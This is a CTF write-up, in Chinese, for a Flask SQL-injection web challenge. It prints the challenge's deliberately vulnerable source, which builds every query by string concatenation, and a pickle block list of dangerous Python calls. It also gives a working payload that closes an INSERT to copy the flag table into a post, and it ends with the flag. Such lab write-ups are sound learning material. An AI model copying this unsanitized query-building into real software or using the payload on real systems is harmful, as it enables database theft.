# Web_python_flask_sql_injection

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=880f28a8-d02a-4b74-8fe1-849fd0378ddc_2)

这题有很多姿势，是大佬们展示的好地方。

我直接放[wp](https://blog.csdn.net/weixin_43610673/article/details/107494085)了，并选择了第一种最简单的方法得到flag。

首先看routes.py，观察有什么路径。

```python
import re
from datetime import datetime
from flask import render_template, flash, redirect, url_for, request
from flask_login import login_user, logout_user, current_user, login_required
from werkzeug.urls import url_parse
from werkzeug.security import generate_password_hash
from app import app, mysql, db_session
from app.forms import LoginForm, RegistrationForm, EditProfileForm, PostForm
from app.models import load_user, load_user_by_username
from others import now, avatar
from itertools import izip


@app.before_request
def before_request():
    if current_user.is_authenticated:
        mysql.Mod('user', {"id": current_user.id},
                  {"last_seen": "'%s'" % now()})


@app.teardown_request
def shutdown_session(exception=None):
    db_session.remove()


@app.route('/', methods=['GET', 'POST'])
@app.route('/index', methods=['GET', 'POST'])
@login_required
def index():
    form = PostForm()
    if form.validate_on_submit():
        res = mysql.Add("post", ['NULL', "'%s'" % form.post.data,
                                 "'%s'" % current_user.id, "'%s'" % now()])
        if res == 1:
            flash('Your post is now live!')
            return redirect(url_for('index'))
    page = request.args.get('page', 1, type=int)
    all_posts = current_user.followed_posts()
    post_per_page = app.config['POSTS_PER_PAGE']
    posts = all_posts[(page - 1) * post_per_page:page * post_per_page if len(
        all_posts) >= page * post_per_page else len(all_posts)]
    next_url = url_for('explore', page=page + 1) \
        if len(all_posts) > page * post_per_page else None
    prev_url = url_for('explore', page=page - 1) \
        if (page > 1 and len(all_posts) > page * post_per_page) else None
    usernames = []
    for i in posts:
        usernames.append(load_user(i[2]))
    return render_template('index.html', title='Home', form=form,
                           posts=posts, next_url=next_url,
                           prev_url=prev_url, usernames=usernames, izip=izip, avatars=avatar, dt=datetime.strptime)


@app.route('/explore')
@login_required
def explore():
    page = request.args.get('page', 1, type=int)
    page = page if page > 0 else 1
    all_posts = mysql.All("post", order=["id desc"])
    post_per_page = app.config['POSTS_PER_PAGE']
    posts = all_posts[
        (page - 1) * post_per_page:page * post_per_page if len(all_posts) >= page * post_per_page else len(
            all_posts)]
    next_url = url_for('explore', page=page + 1) \
        if len(all_posts) > page * post_per_page else None
    prev_url = url_for('explore', page=page - 1) \
        if (page > 1 and len(all_posts) > (page - 1) * post_per_page) else None
    usernames = []
    for i in posts:
        usernames.append(load_user(i[2]))
    return render_template('index.html', title='Home',
                           posts=posts, usernames=usernames, next_url=next_url,
                           prev_url=prev_url, izip=izip, avatars=avatar, dt=datetime.strptime)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    form = LoginForm()
    if form.validate_on_submit():
        user = load_user_by_username(form.username.data)
        if user == -1:
            flash('Something error!')
            return render_template('500.html'), 500
        if user == 0:
            flash('Invalid username or password')
            return redirect(url_for('login'))
        login_user(user, remember=form.remember_me.data)
        next_page = request.args.get('next')
        if not next_page or url_parse(next_page).netloc != '':
            next_page = url_for('index')
        return redirect(next_page)
    return render_template('login.html', title='Sign In', form=form)


@app.route('/logout')
def logout():
    logout_user()
    return redirect(url_for('index'))


@app.route('/register', methods=['GET', 'POST'])
def register():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    form = RegistrationForm()
    if form.validate_on_submit():
        res = mysql.Add("user", ["NULL", "'%s'" % form.username.data, "'%s'" % form.email.data,
                                 "'%s'" % generate_password_hash(form.password.data), "''", "'%s'" % now()])
        if res == 1:
            flash('Congratulations, you are now a registered user!')
            return redirect(url_for('login'))
    return render_template('register.html', title='Register', form=form)


@app.route('/user/<username>')
@login_required
def user(username):
    if re.match("^[a-zA-Z0-9_]+$", username) == None:
        return render_template('500.html'), 500
    user = load_user_by_username(username)
    if user == -1:
        flash('Something error!')
        return render_template('500.html'), 500
    if user == 0:
        flash('User is not exists')
        return redirect(url_for('index'))
    page = request.args.get('page', 1, type=int)
    page = page if page > 0 else 1
    all_posts = current_user.followed_posts()
    post_per_page = app.config['POSTS_PER_PAGE']
    posts = all_posts[
        (page - 1) * post_per_page:page * post_per_page if len(all_posts) >= page * post_per_page else len(
            all_posts)]
    next_url = url_for('user', username=user.username, page=page + 1) \
        if len(all_posts) > page * post_per_page else None
    prev_url = url_for('user', username=user.username, page=page - 1) \
        if (page > 1 and len(all_posts) > (page - 1) * post_per_page) else None
    usernames = []
    for i in posts:
        usernames.append(load_user(i[2]))
    return render_template('user.html', user=user, posts=posts, usernames=usernames,
                           next_url=next_url, prev_url=prev_url, izip=izip, avatars=avatar, dt=datetime.strptime)


@app.route('/edit_profile', methods=['GET', 'POST'])
@login_required
def edit_profile():
    form = EditProfileForm(current_user.username)
    if form.validate_on_submit():
        current_user.username = form.username.data
        current_user.note = form.note.data
        res = mysql.Mod("user", {"id": current_user.id}, {
                        "username": "'%s'" % current_user.username, "note": "'%s'" % current_user.note})
        if res != 0:
            flash('Your changes have been saved.')
        return redirect(url_for('edit_profile'))
    elif request.method == 'GET':
        form.username.data = current_user.username
        form.note.data = current_user.note
    return render_template('edit_profile.html', title='Edit Profile',
                           form=form)


@app.route('/follow/<username>')
@login_required
def follow(username):
    if re.match("^[a-zA-Z0-9_]+$", username) == None:
        return render_template('500.html'), 500
    user = load_user_by_username(username)
    if user == -1:
        flash('Something error!')
        return render_template('500.html'), 500
    if user == 0:
        flash('User is not exists')
        return redirect(url_for('index'))

    if user == current_user:
        flash('You cannot follow yourself!')
        return redirect(url_for('user', username=username))
    if current_user.follow(user):
        flash('You are following {}!'.format(username))
    else:
        flash('Failed!')
    return redirect(url_for('user', username=username))


@app.route('/unfollow/<username>')
@login_required
def unfollow(username):
    if re.match("^[a-zA-Z0-9_]+$", username) == None:
        return render_template('500.html'), 500
    user = load_user_by_username(username)
    if user == -1:
        flash('Something error!')
        return render_template('500.html'), 500
    if user == 0:
        flash('User is not exists')
        return redirect(url_for('index'))

    if user == current_user:
        flash('You cannot unfollow yourself!')
        return redirect(url_for('user', username=username))
    if current_user.unfollow(user):
        flash('You are not following {}.'.format(username))
    else:
        flash('Failed!')
    return redirect(url_for('user', username=username))
```

题目名称说和sql注入有关，那重点关注sql语句。注意到这行代码。

```python
res = mysql.Add("post", ['NULL', "'%s'" % form.post.data,
                    "'%s'" % current_user.id, "'%s'" % now()])
```

几乎所有sql语句都是这样插入的，过滤呢？根本就没有啊，sql注入是必然的。看看Add是什么函数，找到others.py。

```python
#!flask/bin/python
from os import *
from sys import *
import datetime
from hashlib import md5
from pickle import Unpickler as Unpkler
from pickle import *


class Mysql_Operate():
    def __init__(self, Base, engine, dbsession):
        self.db_session = dbsession()
        self.Base = Base
        self.engine = engine

    def Add(self, tablename, values):
        sql = "insert into " + tablename + " "
        sql += "values ("
        sql += "".join(i + "," for i in values)[:-1]
        sql += ")"
        try:
            self.db_session.execute(sql)
            self.db_session.commit()
            return 1
        except:
            return 0

    def Del(self, tablename, where):
        sql = "delete from " + tablename + " "
        sql += "where " + \
            "".join(i + "=" + str(where[i]) + " and " for i in where)[:-4]
        try:
            self.db_session.execute(sql)
            self.db_session.commit()
            return 1
        except:
            return 0

    def Mod(self, tablemame, where, values):
        sql = "update " + tablemame + " "
        sql += "set " + \
            "".join(i + "=" + str(values[i]) + "," for i in values)[:-1] + " "
        sql += "where " + \
            "".join(i + "=" + str(where[i]) + " and " for i in where)[:-4]
        try:
            self.db_session.execute(sql)
            self.db_session.commit()
            return 1
        except:
            return 0

    def Sel(self, tablename, where={}, feildname=["*"], order="", where_symbols="=", l="and"):
        sql = "select "
        sql += "".join(i + "," for i in feildname)[:-1] + " "
        sql += "from " + tablename + " "
        if where != {}:
            sql += "where " + "".join(i + " " + where_symbols + " " +
                                      str(where[i]) + " " + l + " " for i in where)[:-4]
        if order != "":
            sql += "order by " + "".join(i + "," for i in order)[:-1]
        return sql

    def All(self, tablename, where={}, feildname=["*"], order="", where_symbols="=", l="and"):
        sql = self.Sel(tablename, where, feildname, order, where_symbols, l)
        try:
            res = self.db_session.execute(sql).fetchall()
            if res == None:
                return []
            return res
        except:
            return -1

    def One(self, tablename, where={}, feildname=["*"], order="", where_symbols="=", l="and"):
        sql = self.Sel(tablename, where, feildname, order, where_symbols, l)
        try:
            res = self.db_session.execute(sql).fetchone()
            if res == None:
                return 0
            return res
        except:
            return -1

    def Unionall(self, param):
        sql = "".join(i + " union " for i in param)[:-6]
        try:
            res = self.db_session.execute(sql).fetchall()
            if res == None:
                return []
            return res
        except:
            return -1

    def Unionone(self, param):
        sql = "".join(i + " union " for i in param)[:-6]
        try:
            res = self.db_session.execute(sql).fetchone()
            if res == None:
                return []
            return res
        except:
            return -1

    def Init_db(self):
        self.Base.metadata.create_all(self.engine)

    def Drop_db(self):
        self.Base.metadata.drop_all(self.engine)


def now():
    return datetime.datetime.utcnow().strftime("%Y-%m-%d")


def avatar(email, size):
    digest = md5(email.lower().encode('utf-8')).hexdigest()
    return 'https://www.gravatar.com/avatar/{}?d=identicon&s={}'.format(
        digest, size)


black_type_list = [eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen,
                   tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link,
                   lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs,
                   rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv,
                   execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe,
                   spawnv, spawnve, spawnvp, spawnvpe, load, loads]


class FilterException(Exception):

    def __init__(self, value):
        super(FilterException, self).__init__(
            'the callable object {value} is not allowed'.format(value=str(value)))


def _hook_call(func):
    def wrapper(*args, **kwargs):
        print args[0].stack
        if args[0].stack[-2] in black_type_list:
            raise FilterException(args[0].stack[-2])
        return func(*args, **kwargs)
    return wrapper


def load(file):
    unpkler = Unpkler(file)
    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])
    return Unpkler(file).load()
```

Add函数内部也没有过滤。提取出来sql语句：

```python
sql = f"insert into {tablename} values({''.join(i + "," for i in values)[:-1]})"
```

最开始不理解为什么有个[:-1]做倒序，直到我做了个实验。

```python
values=['a','b','c','d']
print(''.join(i + "," for i in values)[:-1])
#a,b,c,d
print(''.join(i + "," for i in values))
#a,b,c,d,
print('a,b,c,d,'[:-1])
#a,b,c,d
```

元素并没有被颠倒，只是去除了末尾多余的逗号。这是咋做到的？又学到了。查看大佬构建的payload。

- ','1','2020-7-20'),(Null,(select flag from flag),'1','2020-7-20')#

此时sql语句是这样的。

```python
#别忘了数组值的传递
res = mysql.Add("post", ['NULL', "'%s'" % form.post.data,
                "'%s'" % current_user.id, "'%s'" % now()])
sql="insert into tablename values('NULL','','1','2020-7-20'),(Null,(select flag from flag),'1','2020-7-20')#"
```

完美闭合，这样会同时增加两条留言记录，一条为空，一条为flag。values中的1是用户id，如果你用于构建payload的用户是第一个就填1，第二个就填2，顺着id来。时间随便填，甚至可以填未来，这样你就能看到来自未来的留言。null遵循正常插入值时的值，不知道原因反正跟着它走就行了。

- ### Flag
  > ctf{6ca1e8b9-d37e-4da3-9679-fa446d8b9d36}